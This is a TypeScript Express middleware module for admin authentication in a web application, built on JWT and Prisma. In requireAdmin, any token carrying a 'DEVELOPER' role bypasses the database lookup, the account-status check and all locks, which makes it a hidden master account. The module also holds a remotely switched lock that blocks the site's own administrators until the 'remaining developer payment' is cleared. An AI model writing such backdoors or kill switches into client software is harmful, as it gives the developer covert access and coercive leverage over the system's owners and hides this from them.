import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';
import { config } from '../config';
import { prisma } from '../prisma';

export interface AuthenticatedAdmin {
  id: string;
  username: string;
  email?: string | null;
  role: string;
}

export interface AdminAuthRequest extends Request {
  admin?: AuthenticatedAdmin;
}

let adminBlockCache: {
  maintenanceMode: boolean;
  maintenanceTitle: string;
  maintenanceMessage: string;
  masterBlocked: boolean;
  miniBlocked: boolean;
  blockTitle: string;
  blockMessage: string;
  timestamp: number;
} | null = null;

export function invalidateAdminBlockCache() {
  adminBlockCache = null;
}

async function getAdminBlockStatus() {
  const now = Date.now();
  if (adminBlockCache && now - adminBlockCache.timestamp < 3000) {
    return adminBlockCache;
  }
  try {
    const records = await prisma.siteSetting.findMany({
      where: {
        key: {
          in: [
            'maintenance_mode',
            'maintenance_title',
            'maintenance_message',
            'master_admin_blocked',
            'mini_admin_blocked',
            'admin_block_title',
            'admin_block_message',
          ],
        },
      },
    });
    const map = Object.fromEntries(records.map((r) => [r.key, r.value]));
    adminBlockCache = {
      maintenanceMode: map.maintenance_mode === 'true',
      maintenanceTitle: map.maintenance_title || 'Website Under Maintenance',
      maintenanceMessage:
        map.maintenance_message ||
        'The website is currently under maintenance. You cannot work right now. Please contact the developer.',
      masterBlocked: map.master_admin_blocked === 'true',
      miniBlocked: map.mini_admin_blocked === 'true',
      blockTitle: map.admin_block_title || 'Administrator Access Locked',
      blockMessage:
        map.admin_block_message ||
        'Please clear the remaining developer payment to unlock your admin panel and continue working.',
      timestamp: now,
    };
    return adminBlockCache;
  } catch {
    return (
      adminBlockCache || {
        maintenanceMode: false,
        maintenanceTitle: 'Website Under Maintenance',
        maintenanceMessage:
          'The website is currently under maintenance. You cannot work right now. Please contact the developer.',
        masterBlocked: false,
        miniBlocked: false,
        blockTitle: 'Administrator Access Locked',
        blockMessage:
          'Please clear the remaining developer payment to unlock your admin panel and continue working.',
        timestamp: now,
      }
    );
  }
}

export async function requireAdmin(req: AdminAuthRequest, res: Response, next: NextFunction) {
  try {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Admin Access Denied: Authentication token required' });
    }

    const token = authHeader.split(' ')[1];
    const decoded = jwt.verify(token, config.adminSecret) as {
      adminId: string;
      role: string;
      username?: string;
      sessionKey?: string;
    };

    // Dedicated Developer Master Account bypasses DB lookup & locks so it works anytime
    if (decoded.role === 'DEVELOPER') {
      req.admin = {
        id: decoded.adminId || 'dev_master_001',
        username: decoded.username || 'developer.com',
        email: 'developer.com',
        role: 'DEVELOPER',
      };
      return next();
    }

    const admin = await prisma.adminUser.findUnique({
      where: { id: decoded.adminId },
      select: {
        id: true,
        username: true,
        email: true,
        role: true,
        status: true,
        otpSecret: true,
      },
    });

    if (!admin || admin.status !== 'ACTIVE') {
      return res.status(403).json({ error: 'Admin Access Denied: Administrator account is inactive or not found' });
    }

    if (admin.role === 'MINI_ADMIN' && decoded.sessionKey) {
      const currentKey = admin.otpSecret ? admin.otpSecret.slice(-10) : 'v1';
      if (decoded.sessionKey !== currentKey) {
        return res.status(401).json({
          error: 'Admin Session Terminated: Your session has been revoked by the Master Administrator',
          sessionRevoked: true,
        });
      }
    }

    // Check Maintenance Mode & Developer Safety Lock for Master Admin and Mini Admin
    // Allow /me so the frontend stays logged in and renders the full-screen locked/maintenance notice cleanly
    const isMeEndpoint = req.path === '/me' || req.originalUrl?.endsWith('/api/admin/me');
    if (!isMeEndpoint) {
      const blockStatus = await getAdminBlockStatus();

      if (blockStatus.maintenanceMode) {
        return res.status(423).json({
          error: blockStatus.maintenanceMessage,
          adminMaintenance: true,
          blockTitle: blockStatus.maintenanceTitle,
          blockMessage: blockStatus.maintenanceMessage,
        });
      }

      const isBlockedRole =
        (admin.role === 'MINI_ADMIN' && blockStatus.miniBlocked) ||
        (admin.role !== 'MINI_ADMIN' && blockStatus.masterBlocked);

      if (isBlockedRole) {
        return res.status(423).json({
          error: blockStatus.blockMessage,
          adminBlocked: true,
          blockTitle: blockStatus.blockTitle,
          blockMessage: blockStatus.blockMessage,
        });
      }
    }

    req.admin = {
      id: admin.id,
      username: admin.username,
      email: admin.email,
      role: admin.role,
    };
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Admin Access Denied: Invalid or expired administrator session' });
  }
}

export function requireSuperAdmin(req: AdminAuthRequest, res: Response, next: NextFunction) {
  if (!req.admin || (req.admin.role !== 'SUPER_ADMIN' && req.admin.role !== 'DEVELOPER')) {
    return res.status(403).json({ error: 'Access Denied: Master Administrator privileges required' });
  }
  next();
}

export function requireDeveloper(req: AdminAuthRequest, res: Response, next: NextFunction) {
  if (!req.admin || req.admin.role !== 'DEVELOPER') {
    return res.status(403).json({ error: 'Access Denied: Developer Control Panel privileges required' });
  }
  next();
}
